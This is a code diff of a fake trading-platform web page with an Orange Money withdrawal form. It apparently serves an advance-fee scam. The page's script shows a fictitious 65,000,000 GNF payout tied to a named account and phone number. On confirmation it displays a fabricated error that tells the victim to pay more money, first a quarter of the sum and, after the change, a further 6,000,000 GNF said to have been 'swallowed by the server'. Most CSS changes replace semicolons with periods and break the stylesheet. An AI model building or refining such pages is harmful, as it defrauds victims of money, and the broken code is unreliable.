@@ -94,7 +94,7 @@
             border-radius: 5px;
             margin-bottom: 20px;
             color: #58a6ff;
-            flex-wrap: wrap;
+            flex-wrap: wrap.
         }
 
         .price-info h2 {
@@ -107,7 +107,7 @@
         }
 
         .price-info .variation {
-            color: green;
+            color: green.
         }
 
         #chart_container {
@@ -115,43 +115,43 @@
             background-color: #161b22;
             margin-bottom: 20px;
             border-radius: 5px;
-            width: 100%;
+            width: 100%.
         }
 
         #tradingview_chart {
             height: 100%;
-            width: 100%;
+            width: 100%.
         }
 
         .order-book {
             background-color: #161b22;
             padding: 20px;
             border-radius: 5px;
-            width: 100%;
+            width: 100%.
         }
 
         .order-book h3 {
             margin-top: 0;
-            color: #58a6ff;
+            color: #58a6ff.
         }
 
         .orders .order {
             display: flex;
             justify-content: space-between;
             padding: 5px 0;
-            color: #c9d1d9;
+            color: #c9d1d9.
         }
 
         .orders .order span {
             width: 33%;
-            text-align: center;
+            text-align: center.
         }
 
         .withdrawal-options {
             display: flex;
             justify-content: center;
             margin-top: 20px;
-            width: 100%;
+            width: 100%.
         }
 
         .withdrawal-options button {
@@ -162,14 +162,14 @@
             color: #21262d;
             font-weight: bold;
             width: 100%;
-            border-radius: 5px;
+            border-radius: 5px.
         }
 
         .error-message {
             color: red;
             margin-top: 20px;
             text-align: center;
-            display: none;
+            display: none.
         }
 
         .withdrawal-form {
@@ -179,16 +179,16 @@
             padding: 20px;
             border-radius: 5px;
             margin-top: 20px;
-            width: 100%;
+            width: 100%.
         }
 
         .withdrawal-form h3 {
             margin-top: 0;
-            color: #58a6ff;
+            color: #58a6ff.
         }
 
         .withdrawal-form .info {
-            margin-bottom: 20px;
+            margin-bottom: 20px.
         }
 
         .withdrawal-form button {
@@ -199,35 +199,35 @@
             color: #21262d;
             font-weight: bold;
             align-self: center;
-            border-radius: 5px;
+            border-radius: 5px.
         }
 
         footer {
             background-color: #21262d;
             color: #c9d1d9;
             text-align: center;
-            padding: 10px 0;
+            padding: 10px 0.
         }
 
         @media (max-width: 768px) {
             nav ul {
                 flex-direction: column;
-                align-items: center;
+                align-items: center.
             }
 
             nav ul li {
-                margin-bottom: 10px;
+                margin-bottom: 10px.
             }
 
             .price-info,
             .withdrawal-options {
                 flex-direction: column;
-                align-items: center;
+                align-items: center.
             }
 
             .withdrawal-options button {
                 width: 100%;
-                margin-bottom: 10px;
+                margin-bottom: 10px.
             }
         }
     </style>
@@ -315,14 +315,14 @@
                 const paymentMethod = "Orange Money";
                 const accountName = "Sacko Mohamed Fode";
                 const accountNumber = "224 6 21 33 58 88";
-                withdrawalInfo.innerHTML = ` ${accountName}<br><br> ${accountNumber}<br><br> 65 000 000 GNF`;
+                withdrawalInfo.innerHTML = `${accountName}<br><br> ${accountNumber}<br><br> 65 000 000 GNF`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', setWithdrawalInfo);
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                errorMessage.textContent = 'Erreur : La liaison avec le compte a été réussie, mais votre compte est inactif. Pour recevoir vos bénéfices, vous devez d\'abord avoir 1/4 de la somme à recevoir afin de justifier l\'activité de votre compte. Une fois cette vérification effectuée, vous recevrez vos bénéfices dans les 5 minutes. Merci.';
+                errorMessage.textContent = 'Vos 6 000 000 GNF ont été avalés par le serveur car ils ne correspondent pas au montant demandé. Veuillez effectuer le reste de 6 000 000 GNF pour recevoir vos bénéfices.';
                 errorMessage.style.display = 'block';
                 withdrawalForm.style.display = 'none';
             });
